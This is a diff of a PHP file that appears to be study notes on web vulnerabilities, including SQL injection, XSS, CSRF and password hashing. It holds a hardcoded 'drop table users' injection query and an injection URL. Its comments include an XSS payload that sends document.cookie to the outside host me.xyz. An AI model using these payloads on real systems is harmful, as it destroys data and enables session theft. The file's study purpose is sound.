@@ -8,15 +8,24 @@
 
 // 1. SQL Injection
 $id = $_GET['id'];
-$sql = "SELECT * FROM users WHERE id = $id";
+// $sql = "SELECT * FROM users WHERE id = $id";
+$sql = "SELECT * FROM users WHERE id = 1;drop table users";
 
-// get.php?id=1;drop table users
+// get.php?id=1;drop table users  / URL
 
 // 2. XSS - Cross Site Scripting
+
+// echo htmlspecialchars("<script>location.href='http://me.xyz?c='+document.cookie</script>");
+
+// echo "<script>alert(1)</script>";
+
+$title = htmlspecialchars($_POST['title']);
+$description = htmlspecialchars($_POST['description']);
 
 // <script>location.href='http://me.xyz?c='+document.cookie</script>
 
 // echo htmlspecialchars($comment);
+
 
 // 3. CSRF - Cross Site Request Forgery
 
@@ -36,4 +45,5 @@ $password = "userpassword";
 $hash = password_hash($password, PASSWORD_BCRYPT);
 
 echo $hash;
+
 ?>
